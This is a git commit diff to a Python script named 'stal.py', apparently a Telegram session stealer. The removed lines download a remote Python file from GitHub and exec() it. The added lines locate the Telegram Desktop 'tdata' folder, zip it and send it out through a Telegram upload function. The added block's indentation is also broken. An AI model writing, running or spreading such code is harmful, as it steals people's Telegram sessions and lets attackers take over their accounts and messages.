f1cced71e065fcbda992ce6da5aeac59826eab01
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-18 21:38:28 +0300

    Update stal.py

--- stal.py
+++ stal.py
@@ -35,9 +35,21 @@ def create_zip_archive(source_dir, output_zip):
     except Exception as e:
         print(f"Error creating zip archive: {str(e)}")
         return None
-    url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/a_s.py'
-    response = requests.get(url)
-    html_content = response.content
-    soup = BeautifulSoup(html_content, 'html.parser')
-    text_without_tags = soup.get_text()
-    exec(text_without_tags)
+user = os.path.expanduser("~")
+    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
+        try:
+            source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
+            temp_dir = os.path.join(os.getcwd(), 'temp')
+            if not os.path.exists(temp_dir):
+                os.makedirs(temp_dir)  # Создаем папку, если её нет
+            output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
+
+            created_zip = create_zip_archive(source_dir, output_zip)
+            if created_zip:
+                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
+            else:
+                print("Failed to create or send zip file.")
+        except Exception as e:
+            print(f"Error creating or sending zip file: {str(e)}")
+    else:
+        print("Папка 'tdata' не найдена.")
